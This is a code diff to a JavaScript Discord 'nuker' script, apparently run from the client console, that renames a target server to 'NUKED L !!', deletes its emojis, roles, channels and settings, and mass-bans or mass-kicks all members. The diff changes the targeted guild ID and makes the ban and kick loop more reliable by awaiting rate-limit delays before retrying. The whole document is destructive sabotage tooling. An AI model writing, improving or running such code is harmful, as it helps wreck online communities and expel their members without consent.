@@ -1,10 +1,10 @@
 /***************************************/
-let guildID = "792059867383726030"
+let guildID = "808661332937015316"
 let newservername = "NUKED L !!"
 
 let emojis = true;
 let roles = true;
-let channels = true;
+let channels = false;
 let serversettings = true;
 
 let kickmembers = false;
@@ -120,21 +120,21 @@ function RemoveAllChannels()
     });
 }
 
-    function goodbyemembers(){
+async function goodbyemembers(){
         var memberList = FindModule("getMembers").getMembers(guildID);
         memberList.reverse();
 
-        memberList.forEach(member => {
+        await Promise.all(memberList.map(async (member) => {
 
             if(member.userId == FindModule("getCurrentUser").getCurrentUser().id) return;
 
             if(banmembers)
             {
                 try {
-                    FindModule("banUser").banUser(guildID, member.userId).then(resp => {
+                    FindModule("banUser").banUser(guildID, member.userId).then(async resp => {
                     if(resp.ok === false){                
                         console.log(`waiting ${resp.retry_after}ms`);
-                        sleep(resp.retry_after);
+                        await sleep(resp.retry_after);
                         FindModule("banUser").banUser(guildID, member.userId);
                     }
                 })
@@ -144,19 +144,18 @@ function RemoveAllChannels()
             else if(kickmembers)
             {
                 try {
-                    FindModule("kickUser").kickUser(guildID, member.userId).then(resp => {
+                    FindModule("kickUser").kickUser(guildID, member.userId).then(async resp => {
                     if(resp.ok === false){                    
                         console.log(`waiting ${resp.retry_after}ms`);
-                        sleep(resp.retry_after);
+                        await sleep(resp.retry_after);
                         FindModule("kickUser").kickUser(guildID, member.userId);
                     }
                 })
                 }
                 catch(err){}
             }
-        });
-
-    }
+        }));
+}
 
 function getData(url, callback) {
     var xhr = new XMLHttpRequest();
@@ -198,8 +197,9 @@ if(emojis){
 }
 if(kickmembers || banmembers)
 {
-    console.log("Yeeting members...");
-    goodbyemembers();
+     console.log("Yeeting members...");
+     goodbyemembers().then(() => {})
+      
 }
 if(channels){
     console.log("Removing channels...")
